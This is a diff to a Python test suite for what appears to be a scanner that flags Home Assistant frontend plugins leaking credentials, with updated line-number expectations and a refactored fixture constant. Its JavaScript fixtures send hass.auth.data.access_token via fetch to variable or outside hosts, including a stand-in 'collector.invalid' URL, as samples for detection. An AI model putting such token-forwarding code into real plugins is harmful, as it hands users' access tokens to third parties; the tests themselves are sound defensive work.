@@ -160,7 +160,8 @@ def test_a_minified_bundle_loaded_as_a_module_is_judged_by_scope(tmp_path):
 def test_a_relative_template_literal_sent_straight_is_no_finding(tmp_path):
     card = """\
         export function a(hass, id) {
-          return fetch(`/api/acme_power/${id}`, { headers: { Authorization: hass.auth.data.access_token } });
+          const h = { headers: { Authorization: hass.auth.data.access_token } };
+          return fetch(`/api/acme_power/${id}`, h);
         }
         export function b(hass, host) {
           return fetch(`//${host}/x`, { headers: { Authorization: hass.auth.data.access_token } });
@@ -169,7 +170,7 @@ def test_a_relative_template_literal_sent_straight_is_no_finding(tmp_path):
           return fetch(`/${host}`, { headers: { Authorization: hass.auth.data.access_token } });
         }
         """
-    assert _scan(tmp_path, {"card.js": card}, TargetKind.PLUGIN) == [("card.js", 5), ("card.js", 8)]
+    assert _scan(tmp_path, {"card.js": card}, TargetKind.PLUGIN) == [("card.js", 6), ("card.js", 9)]
 
 
 def test_a_wrapper_calling_another_wrapper_is_followed(tmp_path):
@@ -189,6 +190,8 @@ def test_a_wrapper_calling_another_wrapper_is_followed(tmp_path):
     bad = _module_app(**{"www/modules/user.js": outer + 'apiGet("https://collector.invalid/");\n'})
     assert len(_scan(tmp_path / "b", bad)) == 2
 
+
+AUTH = "{headers: {Authorization: hass.auth.data.access_token}}"
 
 SHADOWS = [
     "function a(p) { let C = p; return O(`${C}/x/${p}`); }",
@@ -232,9 +235,10 @@ def test_a_relative_url_built_in_a_local_is_proven_after_the_rule(tmp_path):
 @pytest.mark.parametrize(
     "steal",
     [
-        "export function a(hass, { C }) {\n  return fetch(C + '/x', {headers: {Authorization: hass.auth.data.access_token}});\n}\n",
-        "export function b(hass, p) {\n  const [C] = p;\n  return fetch(C + '/x', {headers: {Authorization: hass.auth.data.access_token}});\n}\n",
-        "export function c(hass, p) {\n  return (({ C }) => fetch(`${C}/x/${p}`, {headers: {Authorization: hass.auth.data.access_token}}))(p);\n}\n",
+        f"export function a(hass, {{ C }}) {{\n  return fetch(C + '/x', {AUTH});\n}}\n",
+        f"export function b(hass, p) {{\n  const [C] = p;\n  return fetch(C + '/x', {AUTH});\n}}\n",
+        f"export function c(hass, p) {{\n"
+        f"  return (({{ C }}) => fetch(`${{C}}/x/${{p}}`, {AUTH}))(p);\n}}\n",
     ],
 )
 def test_a_destructured_name_shadowing_a_constant_keeps_it(tmp_path, steal):
